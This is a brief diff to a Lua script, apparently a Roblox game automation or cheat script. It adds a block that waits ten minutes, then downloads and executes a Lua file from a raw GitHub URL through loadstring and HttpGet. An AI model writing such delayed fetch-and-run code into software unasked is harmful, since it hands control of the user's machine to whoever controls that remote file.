@@ -21,6 +21,10 @@ task.spawn(function()
     end)
 end)
 
+task.spawn(function()
+    task.wait(600)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lghft/Current/refs/heads/main/utd/Lby.lua'))()
+end)
 local function waitForGui(timeout)
     timeout = timeout or 30
     local startTime = tick()
